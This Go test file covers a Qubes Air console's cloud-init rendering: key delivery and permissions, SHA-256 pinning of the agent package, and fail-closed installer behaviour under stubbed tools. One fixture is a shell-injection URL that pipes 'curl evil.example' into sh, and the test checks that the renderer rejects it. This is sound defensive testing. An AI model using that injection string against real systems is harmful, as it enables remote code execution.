package service

import (
	"crypto/sha256"
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/slchris/qubes-air/console/internal/pki"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"gopkg.in/yaml.v3"
)

// The artifact store the agent package is actually served from. Plain HTTP,
// no authentication — which is why the digest below is load-bearing.
const testPkgURL = "http://10.31.0.2/local/qubes-air/qubes-air-agent_0.1.0_amd64.deb"

// testPkgPayload stands in for the .deb; the tests hash it themselves so a
// "matching" digest really matches and a mismatching one really does not.
var testPkgPayload = []byte("not really a deb, but it hashes like one\n")

func testPkgSHA() string {
	sum := sha256.Sum256(testPkgPayload)
	return hex.EncodeToString(sum[:])
}

func testAgentPackage() AgentPackage {
	return AgentPackage{URL: testPkgURL, SHA256: testPkgSHA(), Version: "0.1.0"}
}

func renderWith(t *testing.T, pkg AgentPackage) (string, *pki.Bundle) {
	t.Helper()
	ca, err := pki.NewCA("test-ca", 0)
	require.NoError(t, err)
	bundle, err := ca.IssueAgentCert("agent-dev-work", 0)
	require.NoError(t, err)
	out, err := RenderAgentUserData("remote-dev", bundle, "0.0.0.0:8443", pkg)
	require.NoError(t, err)
	return out, bundle
}

func renderFixture(t *testing.T) (string, *pki.Bundle) {
	t.Helper()
	return renderWith(t, testAgentPackage())
}

type cloudConfig struct {
	WriteFiles []struct {
		Path        string `yaml:"path"`
		Permissions string `yaml:"permissions"`
		Owner       string `yaml:"owner"`
		Content     string `yaml:"content"`
	} `yaml:"write_files"`
	Runcmd []any `yaml:"runcmd"`
}

func parseConfig(t *testing.T, out string) cloudConfig {
	t.Helper()
	var cc cloudConfig
	require.NoError(t, yaml.Unmarshal([]byte(out), &cc), "rendered user-data must be valid YAML")
	return cc
}

// fileContent returns a delivered file's content by path suffix.
func fileContent(t *testing.T, cc cloudConfig, suffix string) string {
	t.Helper()
	for _, f := range cc.WriteFiles {
		if strings.HasSuffix(f.Path, suffix) {
			return f.Content
		}
	}
	return ""
}

// TestRenderedUserDataIsValidYAML — cloud-init silently ignores a document it
// cannot parse, so a malformed render produces a VM that boots fine and simply
// has no agent identity. That failure is invisible until something tries to
// connect.
func TestRenderedUserDataIsValidYAML(t *testing.T) {
	out, _ := renderFixture(t)
	assert.True(t, strings.HasPrefix(out, "#cloud-config\n"),
		"cloud-init requires the #cloud-config header to treat this as config")

	cc := parseConfig(t, out)
	assert.Len(t, cc.WriteFiles, 5, "three PEMs, the env file and the package installer")
	assert.NotEmpty(t, cc.Runcmd)
}

// TestPrivateKeySurvivesYAMLRoundTrip is the one that would fail silently.
// PEM is multi-line; if the literal block mangles it — an indentation slip, a
// trailing-space rule — the file still looks like a key and openssl rejects it
// only on the remote, at boot, where nobody is watching.
func TestPrivateKeySurvivesYAMLRoundTrip(t *testing.T) {
	out, bundle := renderFixture(t)
	cc := parseConfig(t, out)

	keyContent := fileContent(t, cc, "agent-key.pem")
	require.NotEmpty(t, keyContent, "the agent key must be delivered")

	assert.Equal(t, strings.TrimRight(bundle.KeyPEM, "\n"), strings.TrimRight(keyContent, "\n"),
		"the key must arrive byte-identical")

	// Prove it, rather than trusting string equality: parse the extracted key.
	cmd := exec.Command("openssl", "ec", "-noout", "-text")
	cmd.Stdin = strings.NewReader(keyContent)
	if err := cmd.Run(); err != nil {
		t.Errorf("openssl could not parse the delivered key: %v", err)
	}
}

// TestPrivateKeyIsNotWorldReadable — a world-readable key on a multi-user host
// hands the agent's identity to every local account, turning a revocable
// credential back into an ambient one.
func TestPrivateKeyIsNotWorldReadable(t *testing.T) {
	out, _ := renderFixture(t)
	cc := parseConfig(t, out)

	for _, f := range cc.WriteFiles {
		if strings.HasSuffix(f.Path, "agent-key.pem") {
			assert.Equal(t, "0600", f.Permissions, "the private key must not be readable by other users")
		}
		assert.Equal(t, "root:root", f.Owner)
	}
}

// TestRemoteNameReachesTheAgent — qubesair.Ping returns this value, and
// CheckReachable compares against it.
func TestRemoteNameReachesTheAgent(t *testing.T) {
	out, _ := renderFixture(t)
	cc := parseConfig(t, out)

	env := fileContent(t, cc, "agent.env")
	assert.Contains(t, env, "QUBESAIR_REMOTE_NAME=remote-dev")
	assert.Contains(t, env, "QUBESAIR_LISTEN=0.0.0.0:8443")
}

// TestCAPrivateKeyNeverDelivered — the bundle excludes it, and the renderer
// must not reintroduce it. This document goes to a host assumed compromisable.
func TestCAPrivateKeyNeverDelivered(t *testing.T) {
	out, _ := renderFixture(t)
	assert.Equal(t, 1, strings.Count(out, "BEGIN EC PRIVATE KEY"),
		"exactly one private key — the agent's — may appear")
}

// TestRenderRejectsIncompleteInput — failing here is far better than emitting a
// document that installs nothing and looks like it worked.
func TestRenderRejectsIncompleteInput(t *testing.T) {
	ca, err := pki.NewCA("t", 0)
	require.NoError(t, err)
	bundle, err := ca.IssueAgentCert("a", 0)
	require.NoError(t, err)

	_, err = RenderAgentUserData("remote", nil, "", testAgentPackage())
	assert.Error(t, err, "a missing bundle must fail")

	_, err = RenderAgentUserData("", bundle, "", testAgentPackage())
	assert.Error(t, err, "a missing remote name must fail: qubesair.Ping reports it")
}

// TestSnippetVolumeIDFormat — Proxmox resolves a snippet by this exact shape,
// and the datastore must declare the snippets content type or the volume is
// not found even with the file present.
func TestSnippetVolumeIDFormat(t *testing.T) {
	assert.Equal(t, "local:snippets/qubes-air-dev-work.yaml", SnippetVolumeID("local", "dev-work"))
	assert.Equal(t, "local:snippets/qubes-air-x.yaml", SnippetVolumeID("", "x"),
		"an unset datastore falls back to local")
	assert.Equal(t, "qubes-air-dev-work.yaml", SnippetFileName("dev-work"),
		"the on-disk name must match the volume id")
}

// TestUserDataInstallsGuestAgent — setting user-data REPLACES a template's own
// cicustom entry, so whatever its vendor snippet did stops happening. Real
// deployment showed exactly that: the template installed qemu-guest-agent from
// its vendor data, delivering an identity silently disabled it, and terraform
// then waited for an IP the guest could never report while the VM sat running.
func TestUserDataInstallsGuestAgent(t *testing.T) {
	out, _ := renderFixture(t)

	var cc struct {
		Packages []string `yaml:"packages"`
		Runcmd   []any    `yaml:"runcmd"`
	}
	require.NoError(t, yaml.Unmarshal([]byte(out), &cc))

	assert.Contains(t, cc.Packages, "qemu-guest-agent",
		"the document must be self-sufficient: terraform cannot see the VM without the guest agent")
	assert.Contains(t, out, "[ systemctl, enable, --now, qemu-guest-agent ]",
		"installing is not enough; the guest agent must be started")
}

// TestGuestAgentIsEnabledBeforeTheAgentInstaller — the installer downloads over
// the network and can stall or fail. If it ran first, terraform would be left
// waiting for an IP the guest has no way to report and the apply would hang to
// its timeout with the VM sitting there running. That already happened once for
// a different reason; the ordering is what stops it happening for this one.
func TestGuestAgentIsEnabledBeforeTheAgentInstaller(t *testing.T) {
	out, _ := renderFixture(t)

	guestAgent := strings.Index(out, "[ systemctl, enable, --now, qemu-guest-agent ]")
	installer := strings.Index(out, "  - [ "+agentInstallerPath+" ]")
	require.NotEqual(t, -1, guestAgent, "the guest agent must be enabled from runcmd")
	require.NotEqual(t, -1, installer, "runcmd must invoke the package installer")
	assert.Less(t, guestAgent, installer,
		"the guest agent must be up before anything that touches the network")
}

// TestAgentPackageIsPinnedInTheDocument — the qube has no other way to learn
// where the agent comes from, and no other way to know it got the right one.
// The digest travels here because the artifact store is unauthenticated plain
// HTTP: this document is the trusted channel, the download is not.
func TestAgentPackageIsPinnedInTheDocument(t *testing.T) {
	out, _ := renderFixture(t)
	cc := parseConfig(t, out)

	installer := fileContent(t, cc, agentInstallerPath)
	require.NotEmpty(t, installer, "the package installer must be delivered")

	assert.Contains(t, installer, "PKG_URL='"+testPkgURL+"'")
	assert.Contains(t, installer, "PKG_SHA='"+testPkgSHA()+"'")
	assert.Contains(t, installer, "PKG_VERSION='0.1.0'",
		"the version is what makes a guest log line name a specific build")
	assert.Contains(t, installer, "sha256sum -c -",
		"the download must be verified, not just fetched")

	for _, f := range cc.WriteFiles {
		if f.Path == agentInstallerPath {
			assert.Equal(t, "0700", f.Permissions,
				"the script that installs a root service must not be writable or readable by others")
		}
	}
}

// TestUppercaseDigestIsNormalized — sha256sum(1) prints lowercase and compares
// textually, so an operator pasting an uppercase digest would get a mismatch on
// a perfectly good package: a fail-closed qube for no reason at all.
func TestUppercaseDigestIsNormalized(t *testing.T) {
	pkg := testAgentPackage()
	pkg.SHA256 = strings.ToUpper(pkg.SHA256)
	out, _ := renderWith(t, pkg)

	assert.Contains(t, fileContent(t, parseConfig(t, out), agentInstallerPath),
		"PKG_SHA='"+testPkgSHA()+"'")
}

// TestUnsafePackageURLIsNeverEmbedded — the URL is interpolated into a shell
// script that runs as root in every guest. A quote in it would end the string
// and hand the rest to sh, turning a console-side typo (or a poisoned config)
// into remote code execution on the whole fleet.
func TestUnsafePackageURLIsNeverEmbedded(t *testing.T) {
	for _, bad := range []string{
		"http://10.31.0.2/x.deb'; curl evil.example | sh; echo '",
		"file:///tmp/x.deb",
		"http://10.31.0.2/a b.deb",
	} {
		out, _ := renderWith(t, AgentPackage{URL: bad, SHA256: testPkgSHA()})
		assert.NotContains(t, out, bad, "an unsafe URL must not reach the guest")

		installer := fileContent(t, parseConfig(t, out), agentInstallerPath)
		assert.Contains(t, installer, "PKG_URL=''", "it must degrade to unpinned, not to a broken script")
		assert.Contains(t, installer, "no agent package pinned",
			"and the guest must say why rather than quietly skipping the agent")
	}
}

// TestUnpinnedConsoleDegradesSafely — an unconfigured console must still emit a
// document cloud-init can parse (an unparseable one is dropped whole, taking
// the identity and the guest agent with it), and must never fall back to
// installing something unverified from an unauthenticated store.
func TestUnpinnedConsoleDegradesSafely(t *testing.T) {
	out, _ := renderWith(t, AgentPackage{})
	cc := parseConfig(t, out)
	assert.Len(t, cc.WriteFiles, 5, "the document stays complete when no package is pinned")

	installer := fileContent(t, cc, agentInstallerPath)
	assert.Contains(t, installer, "PKG_URL=''")
	assert.Contains(t, installer, "agent_package_url and agent_package_sha256 are not set",
		"the guest must name the console setting an operator has to go fix")
	assert.NotContains(t, installer, "curl -fsS --retry 3 --retry-delay 2 --max-time 120 -o \"$DEB\" ''",
		"an unpinned console must not attempt a download at all")
}

// TestURLWithoutDigestIsRefused — pinning is the only integrity control in the
// chain, so a URL on its own is worse than no URL: it would install whatever
// the unauthenticated store was serving, as root, on every new qube.
func TestURLWithoutDigestIsRefused(t *testing.T) {
	out, _ := renderWith(t, AgentPackage{URL: testPkgURL})
	installer := fileContent(t, parseConfig(t, out), agentInstallerPath)

	assert.NotContains(t, installer, "PKG_URL='"+testPkgURL+"'")
	assert.Contains(t, installer, "agent_package_sha256 is not set")
}

// installerRun is what a guest would have observed: the installer's exit
// status, everything it invoked, what it said, and the failure marker it left.
type installerRun struct {
	code   int
	calls  string
	output string
	marker string
}

func (r installerRun) installed() bool { return strings.Contains(r.calls, "dpkg -i") }

// runInstaller executes the delivered installer against stubbed system tools.
//
// The script is what actually protects the fleet, so it is exercised rather
// than pattern-matched: reading "sha256sum -c" in the output proves the string
// is present, not that a mismatch stops before dpkg.
func runInstaller(t *testing.T, userData string, systemctlExit string) installerRun {
	return runInstallerWithStates(t, userData, systemctlExit, "")
}

// runInstallerWithStates drives the sequence systemctl is-active reports, so a
// test can reproduce "forked, then died" rather than only steady states.
func runInstallerWithStates(t *testing.T, userData, systemctlExit, states string) installerRun {
	t.Helper()
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("no sh available")
	}

	dir := t.TempDir()
	script := fileContent(t, parseConfig(t, userData), agentInstallerPath)
	require.NotEmpty(t, script)

	// Redirect the two absolute paths the guest owns. Asserting they were
	// present first means a rename in cloudinit.go fails this test loudly
	// instead of quietly running an unredirected script.
	require.Contains(t, script, "DEB=/run/qubes-air-agent.deb")
	require.Contains(t, script, "MARKER='"+agentFailureMarker+"'")
	marker := filepath.Join(dir, "marker")
	script = strings.ReplaceAll(script, "DEB=/run/qubes-air-agent.deb", "DEB="+dir+"/download.deb")
	script = strings.ReplaceAll(script, "MARKER='"+agentFailureMarker+"'", "MARKER='"+marker+"'")

	scriptPath := filepath.Join(dir, "install")
	require.NoError(t, os.WriteFile(scriptPath, []byte(script), 0o700))

	payload := filepath.Join(dir, "payload.deb")
	require.NoError(t, os.WriteFile(payload, testPkgPayload, 0o600))
	calls := filepath.Join(dir, "calls.log")
	stubs := writeStubs(t, dir)

	cmd := exec.Command("sh", scriptPath)
	cmd.Env = append(os.Environ(),
		"PATH="+stubs+":/usr/bin:/bin",
		"STUB_LOG="+calls,
		"STUB_PAYLOAD="+payload,
		"STUB_SYSTEMCTL_EXIT="+systemctlExit,
		"STUB_ACTIVE_STATES="+states,
	)
	out, err := cmd.CombinedOutput()

	run := installerRun{output: string(out)}
	if err != nil {
		var exitErr *exec.ExitError
		require.ErrorAs(t, err, &exitErr, "installer must exit, not fail to launch")
		run.code = exitErr.ExitCode()
	}
	if b, readErr := os.ReadFile(calls); readErr == nil {
		run.calls = string(b)
	}
	// Absent marker is a result, not an error: a clean install leaves none.
	if b, readErr := os.ReadFile(marker); readErr == nil {
		run.marker = string(b)
	}
	return run
}

// writeStubs provides the guest tools the installer calls. sha256sum is the
// only one that does real work: verification is the behaviour under test, so
// stubbing it into always-succeeding would test nothing.
func writeStubs(t *testing.T, dir string) string {
	t.Helper()
	stubs := filepath.Join(dir, "stubs")
	require.NoError(t, os.MkdirAll(stubs, 0o700))

	write := func(name, body string) {
		require.NoError(t, os.WriteFile(filepath.Join(stubs, name), []byte(body), 0o700))
	}

	write("curl", `#!/bin/sh
echo "curl $*" >> "$STUB_LOG"
dest=
prev=
for a in "$@"; do
  if [ "$prev" = "-o" ]; then dest=$a; fi
  prev=$a
done
[ -n "$dest" ] || exit 2
cp "$STUB_PAYLOAD" "$dest"
`)
	// Absolute paths so the real tool is reachable even though the stub
	// directory shadows its name; falls back to shasum where coreutils is not
	// what is installed (macOS).
	write("sha256sum", `#!/bin/sh
digest() {
  if [ -x /usr/bin/sha256sum ]; then /usr/bin/sha256sum "$@"; else shasum -a 256 "$@"; fi
}
if [ "${1:-}" = "-c" ]; then
  read -r want file
  got=$(digest "$file" | cut -d ' ' -f 1)
  echo "sha256sum -c want=$want got=$got" >> "$STUB_LOG"
  [ "$want" = "$got" ] || exit 1
  exit 0
fi
digest "$@"
`)
	write("dpkg", `#!/bin/sh
echo "dpkg $*" >> "$STUB_LOG"
`)
	// is-active must answer on STDOUT: the installer captures the state rather
	// than sampling a single exit code, because Type=simple reports "active" at
	// fork and only then flips to "failed" when exec fails.
	// STUB_ACTIVE_STATES is consumed one word per call, so a test can drive the
	// real-world sequence "active, active, failed".
	// is-active must answer on STDOUT: the installer captures the state rather
	// than sampling a single exit code, because Type=simple reports "active" at
	// fork and only then flips to "failed" when exec fails.
	//
	// The sequence is consumed one word per call via a file, so it advances
	// ACROSS invocations. Reading it from the environment each time would return
	// the first word forever and quietly make every sequence a steady state —
	// the stub would then pass a test the real installer fails.
	write("systemctl", `#!/bin/sh
echo "systemctl $*" >> "$STUB_LOG"
if [ "$1" = "is-active" ]; then
    STATE_FILE="${STUB_LOG}.states"
    if [ ! -f "$STATE_FILE" ]; then
        printf '%s' "${STUB_ACTIVE_STATES:-active}" > "$STATE_FILE"
    fi
    set -- $(cat "$STATE_FILE")
    if [ "$#" -eq 0 ]; then set -- active; fi
    echo "$1"
    shift
    printf '%s' "$*" > "$STATE_FILE"
    exit 0
fi
exit "${STUB_SYSTEMCTL_EXIT:-0}"
`)
	write("logger", `#!/bin/sh
echo "logger $*" >> "$STUB_LOG"
`)
	return stubs
}

// TestVerifiedPackageIsInstalledAndProvenRunning — the deployment incident was
// a qube that came up healthy with an inactive agent unit, because enabling a
// unit that does not exist succeeds quietly. Installing is therefore not the
// end of the happy path: the installer has to assert the unit is active.
func TestVerifiedPackageIsInstalledAndProvenRunning(t *testing.T) {
	out, _ := renderFixture(t)
	run := runInstaller(t, out, "0")

	assert.Equal(t, 0, run.code, "a matching digest must install cleanly: %s", run.output)
	assert.True(t, run.installed(), "the package must be installed: %s", run.calls)
	assert.Contains(t, run.calls, "systemctl enable --now qubes-air-agent")
	assert.Contains(t, run.calls, "systemctl is-active qubes-air-agent",
		"enable --now returning 0 is not proof the agent is running")
	assert.Empty(t, run.marker, "a successful install must leave no failure marker")
}

// TestHashMismatchNeverReachesDpkg is the fail-closed test. The artifact store
// has no authentication and serves over plain HTTP, so a replaced .deb is a
// realistic event, not a hypothetical one. If verification fell through, the
// console would be installing an attacker's root service on every new qube.
func TestHashMismatchNeverReachesDpkg(t *testing.T) {
	pkg := testAgentPackage()
	pkg.SHA256 = strings.Repeat("ab", 32) // a valid-looking digest of something else
	out, _ := renderWith(t, pkg)

	run := runInstaller(t, out, "0")

	assert.NotEqual(t, 0, run.code, "a mismatch must fail, not warn")
	assert.False(t, run.installed(), "dpkg must never see an unverified package: %s", run.calls)
	assert.NotContains(t, run.calls, "systemctl enable --now qubes-air-agent",
		"nothing may be enabled when nothing was installed")
	assert.Contains(t, run.marker, "SHA256 mismatch",
		"the guest must record why it has no agent, and survive log rotation")
	assert.Contains(t, run.output, "AGENT NOT INSTALLED",
		"the failure must be loud on the console and in cloud-init-output.log")
}

// TestUnpinnedConsoleWithNoImageAgentFailsLoudly — this is the exact shape of
// the original incident: nothing to install, nothing installed, and previously
// nothing said. The qube must now announce that it has no agent instead of
// looking like a clean boot.
func TestUnpinnedConsoleWithNoImageAgentFailsLoudly(t *testing.T) {
	out, _ := renderWith(t, AgentPackage{})

	// systemctl fails: no agent unit was baked into the image either.
	run := runInstaller(t, out, "1")

	assert.NotEqual(t, 0, run.code)
	assert.False(t, run.installed(), "an unpinned console must download and install nothing")
	assert.NotContains(t, run.calls, "curl ", "there is nothing to fetch: %s", run.calls)
	assert.Contains(t, run.marker, "unit not present")
	assert.Contains(t, run.output, "no agent package pinned")
}

// TestUnpinnedConsoleStillUsesAnImageBakedAgent — the packer path put the agent
// in the image. A console that has not been given a package URL yet must not
// break those qubes, but must still say the console needs configuring.
func TestUnpinnedConsoleStillUsesAnImageBakedAgent(t *testing.T) {
	out, _ := renderWith(t, AgentPackage{})

	// systemctl succeeds: the unit was already in the image.
	run := runInstaller(t, out, "0")

	assert.Equal(t, 0, run.code, "an image-provided agent is a working qube: %s", run.output)
	assert.Contains(t, run.calls, "systemctl enable --now qubes-air-agent")
	assert.Contains(t, run.output, "no agent package pinned",
		"working by accident is still worth a warning")
	assert.Empty(t, run.marker)
}

// TestInstallerDoesNotBlockOnCloudFinal — the agent unit must not be ordered
// After=cloud-final.service. The installer runs from cloud-init's runcmd, which
// executes inside cloud-final.service, and starts the unit with a blocking
// systemctl. Ordering the unit after cloud-final makes systemd queue that start
// behind a job that cannot finish until the start returns: the boot hangs
// forever, JobTimeoutSec being infinity for service units.
//
// The hang is invisible — qemu-guest-agent is already up, so terraform reports
// success while every diagnostic the installer would emit sits downstream of
// the block. Two independent reviewers found this before it ever shipped.
func TestInstallerDoesNotBlockOnCloudFinal(t *testing.T) {
	unit, err := os.ReadFile("../../../../packaging/agent-deb/qubes-air-agent.service")
	require.NoError(t, err, "the packaged unit is the thing under test")

	for _, line := range strings.Split(string(unit), "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "#") {
			continue // the comment explaining the deadlock names it on purpose
		}
		assert.NotContains(t, trimmed, "cloud-final.service",
			"ordering against cloud-final deadlocks the boot; see the comment in the unit")
	}
}

// TestInstallerSurvivesForkBeforeExec — the unit is Type=simple, so systemd
// reports it active at fork, before exec. A package built for the wrong
// architecture execs nothing (dpkg checks the Architecture field, never the ELF
// header), so a single is-active check passes on a dead agent. The installer
// must watch the unit settle rather than sample it once.
func TestInstallerSurvivesForkBeforeExec(t *testing.T) {
	out, _ := renderFixture(t)

	assert.Contains(t, out, "failed)", "a unit that lands in failed must be caught")
	assert.Contains(t, out, "settled",
		"one is-active sample cannot distinguish forked-then-died from running")
}

// TestForkThenDieIsCaught — the realistic wrong-architecture failure. dpkg
// validates the Architecture field in the control file, never the ELF header,
// so an arm64 binary in a package marked amd64 installs cleanly. The unit is
// Type=simple, so systemd calls it active the moment it forks; only when exec
// fails does it flip to failed.
//
// Sampling is-active once therefore reports a healthy agent that cannot run at
// all — the exact silent failure this installer exists to remove.
func TestForkThenDieIsCaught(t *testing.T) {
	out, _ := renderFixture(t)
	run := runInstallerWithStates(t, out, "0", "active failed failed failed failed")

	assert.NotEqual(t, 0, run.code, "an agent that dies after forking must fail the install")
	assert.NotEmpty(t, run.marker, "the operator needs a marker explaining why there is no agent")
	assert.Contains(t, run.output, "failed state",
		"the reason must name what happened, not just that something did")
}

// TestIdentitySnippetIsPinnedByContent — the terraform file resource must carry
// a content checksum, not just a path.
//
// Without it terraform tracks only source_file.path, so a REWRITTEN identity at
// the same path is invisible: apply reports success while the node still serves
// the previous file. Observed on real hardware — the console rendered a document
// containing the agent installer, the node kept a version from hours earlier,
// cloud-init ran the stale copy to completion and reported "done", and the qube
// came up healthy with no agent and no error anywhere.
//
// The blast radius is larger than one missing installer: CERTIFICATE ROTATION
// travels this same path. A reissued certificate would never reach the qube,
// and every apply would keep saying it succeeded.
func TestIdentitySnippetIsPinnedByContent(t *testing.T) {
	mod, err := os.ReadFile("../../../../terraform/modules/remote-qube-base/providers/proxmox/main.tf")
	require.NoError(t, err)

	idx := strings.Index(string(mod), `resource "proxmox_virtual_environment_file" "agent_identity"`)
	require.NotEqual(t, -1, idx, "the agent identity resource must exist")

	// Look only at that resource's body, so a checksum on some unrelated
	// resource cannot satisfy this test.
	body := string(mod)[idx:]
	if end := strings.Index(body[1:], "\nresource "); end != -1 {
		body = body[:end]
	}
	assert.Contains(t, body, "checksum",
		"source_file must pin content; tracking only the path silently delivers stale identities")
	assert.Contains(t, body, "filesha256",
		"the checksum must be computed from the file, not hardcoded")
}
